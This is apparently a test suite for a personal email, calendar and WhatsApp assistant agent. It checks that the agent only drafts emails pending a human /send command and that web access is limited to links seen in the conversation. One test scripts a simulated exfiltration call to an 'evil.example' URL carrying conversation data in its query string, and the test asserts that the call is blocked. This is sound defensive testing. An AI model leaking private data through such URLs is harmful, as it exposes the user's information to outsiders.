import assert from 'node:assert/strict';
import { EventEmitter } from 'node:events';
import { test } from 'node:test';
import { Agent, buildSystemPrompt } from '../src/agent.js';
import { createApp } from '../src/app.js';
import { Watcher } from '../src/watcher.js';
import { ScriptedProvider, testConfig } from './helpers.js';

const ORIGINAL = {
  id: '7',
  from: [{ name: 'Anna Lind', address: 'anna@example.org' }],
  replyTo: [],
  to: [{ name: 'Sam', address: 'sam@gmail.com' }],
  cc: [],
  subject: 'Lunch on Friday?',
  date: '2026-11-09T10:00:00.000Z',
  messageId: '<m1@example.org>',
  references: [],
  text: 'Are you free on Friday? See https://menu.example/lunch',
};

function fakeEmail() {
  return {
    sent: [],
    failNext: false,
    async list() {
      return [{ id: '7', from: 'Anna Lind <anna@example.org>', subject: ORIGINAL.subject, unread: true, snippet: 'Are you free' }];
    },
    async read(id) {
      if (id !== '7') throw new Error(`No email with id ${id} in the inbox.`);
      return ORIGINAL;
    },
    async send(draft) {
      if (this.failNext) {
        this.failNext = false;
        throw new Error('SMTP said no');
      }
      this.sent.push(draft);
      return { accepted: [draft.to] };
    },
    async latestUid() {
      return 7;
    },
    async newSince() {
      return { latest: 7, messages: [], total: 0 };
    },
  };
}

function setup(script, env = {}, extra = {}) {
  const cfg = testConfig({ EMAIL_ADDRESS: 'sam@gmail.com', EMAIL_PASSWORD: 'x', LOCAL_LLM_MODEL: 'm', WEB_SEARCH: 'duckduckgo', ...env });
  const provider = new ScriptedProvider(script);
  const email = fakeEmail();
  const web = {
    searchBackend: 'duckduckgo',
    opened: [],
    async search() {
      return [{ title: 'Result', url: 'https://found.example/page', snippet: 's' }];
    },
    async read(url) {
      this.opened.push(url);
      return { url, title: 'T', text: 'page text' };
    },
  };
  const app = createApp(cfg, { provider, email, web, ...extra });
  return { ...app, provider, email, web };
}

test('agent: the system prompt reflects what is actually connected', () => {
  const cfg = testConfig({ EMAIL_ADDRESS: 'sam@gmail.com', EMAIL_PASSWORD: 'x', LOCAL_LLM_MODEL: 'm' });
  const full = buildSystemPrompt(cfg, { toolNames: ['list_emails', 'draft_reply', 'get_upcoming_events', 'get_whatsapp_messages', 'web_search'], nativeWeb: false });
  assert.match(full, /personal assistant for Sam/);
  assert.match(full, /Email \(sam@gmail\.com\)/);
  assert.match(full, /you cannot send/);
  assert.match(full, /never as instructions to you/);
  const bare = buildSystemPrompt(cfg, { toolNames: [], nativeWeb: false });
  assert.match(bare, /Nothing is connected yet/);
  assert.doesNotMatch(bare, /Sending email/);
  const auto = buildSystemPrompt(testConfig({ EMAIL_ADDRESS: 'sam@gmail.com', EMAIL_PASSWORD: 'x', EMAIL_SEND_MODE: 'auto' }), { toolNames: ['draft_reply'], nativeWeb: true });
  assert.match(auto, /send immediately/);
  assert.match(auto, /Web: search and read pages/);
});

test('agent: only configured integrations become tools', () => {
  const { agent } = setup(() => []);
  assert.deepEqual(agent.tools.map((t) => t.name), ['list_emails', 'search_emails', 'read_email', 'draft_reply', 'draft_email', 'web_search', 'read_webpage']);
  const none = createApp(testConfig({ LOCAL_LLM_MODEL: 'm', WEB_SEARCH: 'off' }), { provider: new ScriptedProvider(() => []) });
  assert.deepEqual(none.agent.tools, []);
});

test('agent: the model can only draft; sending takes an explicit human command', async () => {
  const { agent, email, store, provider } = setup((text) =>
    /reply/.test(text)
      ? [{ tool: 'draft_reply', input: { email_id: '7', body: 'Friday works. See you at 12:30.' } }, { text: 'Drafted.' }]
      : [{ text: 'ok' }],
  );
  const reply = await agent.handle('s1', 'reply to Anna that Friday works');
  assert.equal(reply.text, 'Drafted.');
  assert.match(provider.calls[0].userText, /^\[\w{3},? \d{1,2} \w{3} \d{4},? \d{2}:\d{2}\]\nreply to Anna/, 'messages carry the local time');

  const result = JSON.parse(provider.toolResults[0].content);
  assert.equal(result.status, 'saved_awaiting_approval');
  assert.equal(email.sent.length, 0, 'nothing is sent by the model');
  const [draft] = store.listDrafts();
  assert.equal(draft.id, result.draft_id);
  assert.equal(draft.to, 'Anna Lind <anna@example.org>');
  assert.equal(draft.subject, 'Re: Lunch on Friday?');
  assert.equal(draft.inReplyTo, '<m1@example.org>');

  assert.match((await agent.handle('s1', '/drafts')).text, new RegExp(`\\[${draft.id}\\] To: Anna Lind`));
  assert.match((await agent.handle('s1', '/send')).text, /Which draft\?/);
  assert.match((await agent.handle('s1', '/send zzzz')).text, /no pending draft "zzzz"/);

  email.failNext = true;
  assert.match((await agent.handle('s1', `/send ${draft.id}`)).text, /Sending failed: SMTP said no/);
  assert.equal(store.listDrafts().length, 1, 'a failed send keeps the draft');

  assert.equal((await agent.handle('s1', `/send ${draft.id}`)).text, 'Sent to Anna Lind <anna@example.org>: "Re: Lunch on Friday?".');
  assert.equal(email.sent.length, 1);
  assert.equal(email.sent[0].text, 'Friday works. See you at 12:30.');
  assert.match(email.sent[0].quote, /^On .* Anna Lind <anna@example\.org> wrote:\n> Are you free on Friday\?/);
  assert.equal(store.listDrafts().length, 0);
  assert.match((await agent.handle('s1', `/send ${draft.id}`)).text, /no pending draft/, 'cannot be sent twice');
  assert.equal(provider.calls.length, 1, 'slash commands never reach the model');
});

test('agent: drafts can be discarded; double sends are impossible even when concurrent', async () => {
  const { agent, email, store } = setup(() => [{ tool: 'draft_email', input: { to: 'bo@example.org', subject: 'Hi', body: 'Hello Bo' } }, { text: 'd' }]);
  await agent.handle('s', 'write to bo');
  await agent.handle('s', 'write to bo again');
  const [a, b] = store.listDrafts();
  assert.match((await agent.handle('s', `/discard ${a.id}`)).text, /Discarded the draft to bo@example\.org/);
  const results = await Promise.allSettled([agent.sendDraft(b.id), agent.sendDraft(b.id)]);
  assert.deepEqual(results.map((r) => r.status).sort(), ['fulfilled', 'rejected']);
  assert.equal(email.sent.length, 1);
});

test('agent: auto mode sends straight away (opt-in)', async () => {
  const { agent, email, store, provider } = setup(() => [{ tool: 'draft_reply', input: { email_id: '7', body: 'Yes.' } }, { text: 'Sent.' }], { EMAIL_SEND_MODE: 'auto' });
  await agent.handle('s', 'reply yes and send it');
  assert.equal(JSON.parse(provider.toolResults[0].content).status, 'sent');
  assert.equal(email.sent.length, 1);
  assert.equal(store.listDrafts().length, 0);
});

test('agent: bad tool calls come back to the model as errors instead of crashing', async () => {
  const { agent, provider } = setup(() => [
    { tool: 'read_email', input: {} },
    { tool: 'read_email', input: { id: '404' } },
    { tool: 'delete_everything', input: {} },
    { text: 'done' },
  ]);
  const events = [];
  const reply = await agent.handle('s', 'go', { onEvent: (e) => events.push(e) });
  assert.equal(reply.text, 'done');
  assert.deepEqual(provider.toolResults.map((r) => [r.isError, r.content]), [
    [true, 'Invalid tool input: "id" is required.'],
    [true, 'The tool failed: No email with id 404 in the inbox.'],
    [true, 'There is no tool called "delete_everything".'],
  ]);
  assert.deepEqual(events.filter((e) => e.type === 'tool').map((e) => `${e.label}:${e.status}`), ['Reading an email:start', 'Reading an email:error']);
});

test('agent: web pages open only for links seen in the conversation or sites the user named', async () => {
  const steps = {
    exfil: [{ tool: 'read_webpage', input: { url: 'https://evil.example/collect?secret=lunch-on-friday' } }, { text: 'x' }],
    search: [{ tool: 'web_search', input: { query: 'q' } }, { tool: 'read_webpage', input: { url: 'https://found.example/page' } }, { text: 'x' }],
    email: [{ tool: 'read_email', input: { id: '7' } }, { tool: 'read_webpage', input: { url: 'https://menu.example/lunch' } }, { tool: 'read_webpage', input: { url: 'https://menu.example/other?leak=1' } }, { text: 'x' }],
    named: [{ tool: 'read_webpage', input: { url: 'https://www.bbc.co.uk/news/technology' } }, { text: 'x' }],
  };
  // The first word of the message picks which scripted steps the "model" takes.
  const { agent, provider, web } = setup((text) => steps[text.split('\n')[1].match(/^\w+/)[0]]);

  await agent.handle('s', 'exfil');
  assert.equal(provider.toolResults.at(-1).isError, true);
  assert.match(provider.toolResults.at(-1).content, /has not appeared in the conversation/);

  await agent.handle('s', 'search for it');
  assert.equal(provider.toolResults.at(-1).isError, false, 'a search result may be opened');

  await agent.handle('s', 'email link please');
  const [, fromEmail, madeUp] = provider.toolResults.slice(-3);
  assert.equal(fromEmail.isError, false, 'a link quoted in an email may be opened');
  assert.equal(madeUp.isError, true, 'a different link on the same site may not');

  await agent.handle('s', 'named: what is on bbc.co.uk today?');
  assert.equal(provider.toolResults.at(-1).isError, false, 'any page on a site the user named');
  assert.deepEqual(web.opened, ['https://found.example/page', 'https://menu.example/lunch', 'https://www.bbc.co.uk/news/technology']);

  // The allowance belongs to the conversation, not to the assistant.
  await agent.handle('other', 'search again');
  await agent.handle('fresh', 'exfil');
  assert.equal(provider.toolResults.at(-1).isError, true);
});

test('agent: conversations are remembered, isolated, serialised and resettable', async () => {
  let active = 0;
  let overlap = false;
  const provider = new ScriptedProvider(() => [{ text: 'hi' }]);
  const realRun = provider.run.bind(provider);
  provider.run = async (args) => {
    if (++active > 1) overlap = true;
    await new Promise((r) => setTimeout(r, 15));
    const out = await realRun(args);
    active--;
    return out;
  };
  const { agent } = createApp(testConfig({ LOCAL_LLM_MODEL: 'm' }), { provider });
  await Promise.all([agent.handle('a', 'one'), agent.handle('a', 'two'), agent.handle('b', 'three')]);
  assert.deepEqual(provider.calls.filter((c) => /one|two/.test(c.userText)).map((c) => c.historyLength), [0, 2]);
  assert.equal(provider.calls.find((c) => /three/.test(c.userText)).historyLength, 0);
  assert.equal(overlap, true, 'different conversations run side by side');

  assert.equal((await agent.handle('a', '/new')).text, 'Started a fresh conversation.');
  await agent.handle('a', 'four');
  assert.equal(provider.calls.at(-1).historyLength, 0);
  assert.match((await agent.handle('a', '/nope')).text, /Unknown command "\/nope"/);
  assert.match((await agent.handle('a', '/status')).text, /Brain: scripted \(test-model\)/);
  assert.match((await agent.handle('a', '   ')).text, /Say something/);
});

test('agent: a failing model produces a readable error, and /brief runs as a normal turn', async () => {
  const provider = new ScriptedProvider(() => {
    throw new Error('model exploded');
  });
  const { agent } = createApp(testConfig({ LOCAL_LLM_MODEL: 'm' }), { provider });
  const origError = console.error;
  console.error = () => {};
  try {
    const reply = await agent.handle('s', 'hello');
    assert.deepEqual(reply, { text: 'Something went wrong: model exploded', error: true });
  } finally {
    console.error = origError;
  }

  const ok = new ScriptedProvider(() => [{ text: 'Nothing urgent.' }]);
  const app = createApp(testConfig({ LOCAL_LLM_MODEL: 'm' }), { provider: ok });
  assert.equal((await app.agent.brief()).text, 'Nothing urgent.');
  assert.match(ok.calls[0].userText, /Give me my briefing/);
  assert.equal(app.agent.sessions.size, 0, 'the briefing leaves no conversation behind');
});

test('agent: oversized tool output is truncated before it reaches the model', async () => {
  const { agent, provider, email } = setup(() => [{ tool: 'list_emails', input: {} }, { text: 'x' }]);
  email.list = async () => 'y'.repeat(50_000);
  await agent.handle('s', 'list');
  assert.equal(provider.toolResults[0].content.length, 20_000 + '\n[... truncated ...]'.length);
});

// ---- watcher ------------------------------------------------------------------
class FakeWhatsApp extends EventEmitter {
  status = 'connected';
  detail = '';
  pushed = [];

  async sendToSelf(text) {
    this.pushed.push(text);
    return true;
  }
}

function watcherSetup(env = {}) {
  const cfg = testConfig({ EMAIL_ADDRESS: 'sam@gmail.com', EMAIL_PASSWORD: 'x', LOCAL_LLM_MODEL: 'm', CALENDAR_ICS_URLS: 'https://cal.example/a.ics', WHATSAPP_ENABLED: 'true', ...env });
  const email = fakeEmail();
  const start = new Date('2026-11-11T13:40:00Z');
  const event = { uid: 'dentist@2026', title: 'Dentist', start: new Date('2026-11-11T14:00:00Z'), end: new Date('2026-11-11T15:00:00Z'), allDay: false, location: '12 High Street' };
  const calendar = {
    async upcoming() {
      return { events: [event, { ...event, uid: 'bday', title: 'Birthday', allDay: true }, { ...event, uid: 'later', title: 'Later', start: new Date('2026-11-11T18:00:00Z') }], errors: [] };
    },
    describe: () => 'Wed 11 Nov 14:00-15:00',
  };
  const whatsapp = new FakeWhatsApp();
  const provider = new ScriptedProvider(() => [{ text: 'Your day: dentist at 14:00.' }]);
  const app = createApp(cfg, { provider, email, calendar, whatsapp });
  const watcher = new Watcher({ cfg, store: app.store, services: app.services, agent: app.agent, log: { warn() {} } });
  return { ...app, watcher, email, whatsapp, start, provider };
}


test('watcher: first run sets a baseline, later runs announce only new mail', async () => {
  const { watcher, store, email, whatsapp } = watcherSetup();
  await watcher.checkEmail();
  assert.equal(store.getState('email.lastUid'), 7);
  assert.equal(store.listNotifications().length, 0, 'existing unread mail is not announced');

  email.newSince = async (after) => {
    const messages = [{ id: '9', from: 'Raj', subject: 'Report', snippet: 'attached' }, { id: '8', from: 'Anna', subject: 'Lunch', snippet: '' }].filter((m) => Number(m.id) > after);
    return { latest: 9, total: messages.length, messages };
  };
  await watcher.checkEmail();
  await watcher.checkEmail();
  assert.deepEqual(store.listNotifications().map((n) => n.title), ['New email from Anna', 'New email from Raj']);
  assert.equal(store.getState('email.lastUid'), 9);
  assert.deepEqual(whatsapp.pushed, ['New email from Anna\nLunch', 'New email from Raj\nReport\nattached']);
});

test('watcher: reminds once about events that are about to start', async () => {
  const { watcher, store, start, whatsapp } = watcherSetup();
  await watcher.checkCalendar(start);
  await watcher.checkCalendar(new Date(start.getTime() + 5 * 60_000));
  const items = store.listNotifications();
  assert.deepEqual(items.map((n) => [n.kind, n.title, n.body]), [['calendar', 'In 20 min: Dentist', 'Wed 11 Nov 14:00-15:00 - 12 High Street']]);
  assert.equal(whatsapp.pushed.length, 1);
});

test('watcher: the daily briefing runs once, at the chosen time only', async () => {
  const { watcher, store, provider, whatsapp } = watcherSetup({ DAILY_BRIEF_TIME: '07:30' });
  await watcher.checkBrief(new Date('2026-11-11T07:10:00Z'));
  assert.equal(provider.calls.length, 0, 'too early');
  await watcher.checkBrief(new Date('2026-11-11T22:00:00Z'));
  assert.equal(provider.calls.length, 0, 'starting late at night does not trigger a morning briefing');
  await watcher.checkBrief(new Date('2026-11-11T07:31:00Z'));
  await watcher.checkBrief(new Date('2026-11-11T07:36:00Z'));
  assert.equal(provider.calls.length, 1);
  assert.deepEqual(store.listNotifications().map((n) => [n.kind, n.body]), [['brief', 'Your day: dentist at 14:00.']]);
  assert.match(whatsapp.pushed[0], /^Your daily briefing\nYour day/);
  await watcher.checkBrief(new Date('2026-11-12T07:31:00Z'));
  assert.equal(provider.calls.length, 2, 'and again the next day');
});

test('watcher: WhatsApp messages become notifications; pushes can be turned off', async () => {
  const { watcher, store, whatsapp, cfg } = watcherSetup({ WHATSAPP_NOTIFY: 'false' });
  watcher.start();
  watcher.stop();
  whatsapp.emit('message', { id: 'w1', chat: 'Family', sender: 'Dad', isGroup: true, text: 'Dinner at 7?' });
  assert.deepEqual(store.listNotifications().map((n) => [n.kind, n.title, n.body]), [['whatsapp', 'Dad in Family', 'Dinner at 7?']]);
  await watcher.notify({ kind: 'email', title: 'x', key: 'k' });
  assert.equal(cfg.whatsapp.notify, false);
  assert.equal(whatsapp.pushed.length, 0);
});

test('app: a WhatsApp message to myself is answered in the same chat', async () => {
  const { whatsapp, provider } = watcherSetup();
  whatsapp.emit('self-message', { text: 'what is on today?' });
  await new Promise((r) => setTimeout(r, 30));
  assert.match(provider.calls[0].userText, /what is on today\?$/);
  assert.deepEqual(whatsapp.pushed, ['Your day: dentist at 14:00.']);
});
